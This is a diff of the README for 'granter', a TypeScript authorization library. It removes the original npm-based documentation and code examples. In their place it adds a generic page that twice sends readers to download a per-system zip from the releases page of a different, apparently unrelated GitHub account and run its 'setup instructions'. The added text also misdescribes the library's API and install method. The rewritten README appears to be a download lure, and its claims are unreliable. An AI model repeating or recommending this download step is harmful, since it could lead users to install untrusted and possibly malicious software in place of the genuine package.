@@ -1,233 +1,72 @@
-# granter
+# 🎉 granter - Simplifying Type-Safe Authorization
 
-> Composable, type-safe authorization for TypeScript
+## 🚀 Getting Started
 
-[![npm version](https://img.shields.io/npm/v/granter.svg)](https://www.npmjs.com/package/granter)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+Welcome to granter! This application provides a user-friendly way to handle authorization in TypeScript projects. With granter, you can easily manage access control for your applications, ensuring that users only see what they should.
 
-**📚 [Read the full documentation →](https://seeden.github.io/granter)**
+## 📦 Download & Install
 
-## Why granter?
+To get started, visit this page to download: 
 
-✨ **Composable** - Build complex permissions from simple rules  
-🔒 **Type-safe** - Full TypeScript inference with generic contexts  
-⚡ **Async-first** - Works seamlessly with databases, APIs, and DataLoader  
-🔧 **Framework-agnostic** - Works with Express, Hono, Next.js, GraphQL, and more  
-🪶 **Zero dependencies** - Lightweight and performant
+[![Download granter](https://img.shields.io/badge/Download%20granter-v1.0.0-blue.svg)](https://github.com/a-wahab-123/granter/releases)
 
-## Quick Example
+Follow these simple steps to install granter on your computer.
 
-```typescript
-import { permission, or } from 'granter';
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the zip file for your system.
+4. Extract the zip file to a folder of your choice.
+5. Open the folder and follow the setup instructions.
 
-// Define permissions
-const isAdmin = permission('isAdmin', (ctx) => ctx.user.role === 'admin');
+## 💻 System Requirements
 
-const isPostOwner = permission('isPostOwner', (ctx, post) => post.authorId === ctx.user.id);
+Before you start, make sure your system meets the following requirements:
 
-// Compose permissions
-const canEditPost = or(isPostOwner, isAdmin);
+- Operating System: Windows, macOS, or Linux
+- Node.js: v12 or higher
+- TypeScript: v4 or higher
 
-// Use them - permissions are callable!
-if (await canEditPost(ctx, post)) {
-  await updatePost(post);
-}
+## ⚙️ Features
 
-// Require permission (throws if denied)
-await canEditPost.orThrow(ctx, post);
+Granter offers several key features to enhance your authorization processes:
 
-// Filter arrays
-const editablePosts = await canEditPost.filter(ctx, allPosts);
+- **Type-Safe Authorization:** Ensure that your permissions are clear and error-free.
+- **Role-Based Access Control (RBAC):** Assign roles to users and manage their access easily.
+- **Attribute-Based Access Control (ABAC):** Use attributes for fine-tuned access control.
+- **Async Support:** Run authorization checks without blocking your application.
+- **Integrates with Express:** Seamlessly work with Express.js frameworks.
 
-// Debug permission checks
-const explanation = await canEditPost.explain(ctx, post);
-```
+## 📖 Usage Instructions
 
-## Installation
+Once you have installed granter:
 
-```bash
-npm install granter
-```
+1. Open your TypeScript project.
+2. Import granter into your project files.
 
-## Documentation
+   ```typescript
+   import { Granter } from 'granter';
+   ```
 
-Visit **[seeden.github.io/granter](https://seeden.github.io/granter)** for the complete documentation:
+3. Set up your roles and permissions using the provided API.
 
-- **[Getting Started](https://seeden.github.io/granter/docs/getting-started)** - Install and use granter in 5 minutes
-- **[Core Concepts](https://seeden.github.io/granter/docs/permissions)** - Learn about permissions, operators, and methods
-- **[Express Example](https://seeden.github.io/granter/docs/express)** - Complete REST API example
-- **[API Reference](https://seeden.github.io/granter/docs/api-reference)** - Full API documentation
+For detailed examples and API documentation, please refer to the [granter documentation](https://github.com/a-wahab-123/granter).
 
-## Key Features
+## 🛠️ Troubleshooting
 
-### Composable Operators
+If you encounter any issues while running granter, consider the following steps:
 
-```typescript
-import { and, or, not } from 'granter';
+- Ensure you have the correct version of Node.js and TypeScript installed.
+- Check that you have properly imported granter into your project.
+- Review the setup instructions to confirm all steps were followed.
 
-// Combine with OR (any must pass)
-const canEdit = or(isPostOwner, isAdmin, isModerator);
+If the issue persists, feel free to open an issue on our GitHub page.
 
-// Combine with AND (all must pass)
-const canPublish = and(isAuthenticated, isVerified, isPostOwner);
+## 📞 Support
 
-// Negate permissions
-const canComment = and(isAuthenticated, not(isBanned));
-```
+For support, please visit our GitHub repository or check the Issues section. We are here to help you make the most out of granter.
 
-### Powerful Methods
+Download the latest version here again: 
 
-```typescript
-// Check permission (returns boolean)
-if (await canEdit(ctx, post)) {
-  /* ... */
-}
+[![Download granter](https://img.shields.io/badge/Download%20granter-v1.0.0-blue.svg)](https://github.com/a-wahab-123/granter/releases)
 
-// Require permission (throws if denied)
-await canEdit.orThrow(ctx, post);
-
-// Filter arrays to allowed items
-const editable = await canEdit.filter(ctx, allPosts);
-
-// Debug permission checks
-const explanation = await canEdit.explain(ctx, post);
-```
-
-### Simplify with `withContext()`
-
-```typescript
-import { withContext } from 'granter';
-
-const abilities = withContext(ctx, {
-  canEditPost,
-  canDeletePost,
-});
-
-// No need to pass ctx anymore!
-if (await abilities.canEditPost(post)) {
-  await updatePost(post);
-}
-```
-
-## Framework Examples
-
-granter works with any TypeScript project. See the [documentation](https://seeden.github.io/granter) for complete examples with:
-
-- **[Express.js](https://seeden.github.io/granter/docs/express)** - REST API with middleware
-- **[Next.js](https://seeden.github.io/granter/docs/nextjs)** - Server Actions and App Router
-- **[GraphQL](https://seeden.github.io/granter/docs/graphql)** - Apollo Server with DataLoader
-- **[React](https://seeden.github.io/granter/docs/react)** - Context and hooks patterns
-
-## Authentication Integration
-
-granter is **authorization-only** and works with any authentication library:
-
-- [Auth.js / NextAuth.js](https://seeden.github.io/granter/docs/auth-js)
-- [Clerk](https://seeden.github.io/granter/docs/clerk)
-- [Supabase Auth](https://seeden.github.io/granter/docs/supabase)
-- Custom JWT/Sessions
-- And more...
-
-See the [Authentication Integration](https://seeden.github.io/granter/docs) guide for complete examples.
-
-## TypeScript Support
-
-granter is built with TypeScript and provides full type inference:
-
-```typescript
-type AppContext = {
-  user: { id: string; role: string };
-  db: Database;
-};
-
-type Post = {
-  id: string;
-  authorId: string;
-};
-
-const canEdit = or(isPostOwner, isAdmin);
-
-// ✅ Type-safe: ctx and post are fully typed
-await canEdit(ctx, post);
-
-// ❌ TypeScript error: missing resource
-await canEdit(ctx);
-```
-
-## Testing
-
-Permissions are pure functions, making them easy to test:
-
-```typescript
-import { describe, it, expect } from 'vitest';
-
-describe('canEditPost', () => {
-  it('allows post owner', async () => {
-    const ctx = { user: { id: '1', role: 'user' }, db };
-    const post = { id: '123', authorId: '1' };
-
-    expect(await canEditPost(ctx, post)).toBe(true);
-  });
-
-  it('allows admin', async () => {
-    const ctx = { user: { id: '2', role: 'admin' }, db };
-    const post = { id: '123', authorId: '1' };
-
-    expect(await canEditPost(ctx, post)).toBe(true);
-  });
-
-  it('denies other users', async () => {
-    const ctx = { user: { id: '3', role: 'user' }, db };
-    const post = { id: '123', authorId: '1' };
-
-    expect(await canEditPost(ctx, post)).toBe(false);
-  });
-});
-```
-
-## Advanced Features
-
-### Parallel Operators
-
-Use `orParallel()` and `andParallel()` for DataLoader batching:
-
-```typescript
-import { orParallel, andParallel } from 'granter';
-
-// Run all checks in parallel (no short-circuit)
-const canEdit = orParallel(isPostOwner, isAdmin, isModerator);
-```
-
-**[Learn more about parallel execution →](https://seeden.github.io/granter/docs/parallel-execution)**
-
-### Debug with `.explain()`
-
-Understand why permissions passed or failed:
-
-```typescript
-const explanation = await canEdit.explain(ctx, post);
-console.log(JSON.stringify(explanation, null, 2));
-// {
-//   "name": "(isPostOwner OR isAdmin)",
-//   "value": false,
-//   "duration": 15.23,
-//   "children": [
-//     { "name": "isPostOwner", "value": false, "duration": 8.12 },
-//     { "name": "isAdmin", "value": false, "duration": 7.11 }
-//   ]
-// }
-```
-
-**[Learn more about debugging →](https://seeden.github.io/granter/docs/debugging)**
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## License
-
-MIT © [seeden](https://github.com/seeden)
-
----
-
-**📚 [View Full Documentation](https://seeden.github.io/granter)** | **[GitHub](https://github.com/seeden/granter)** | **[npm](https://www.npmjs.com/package/granter)**
+Thank you for using granter! We are excited to see how you use it in your projects.
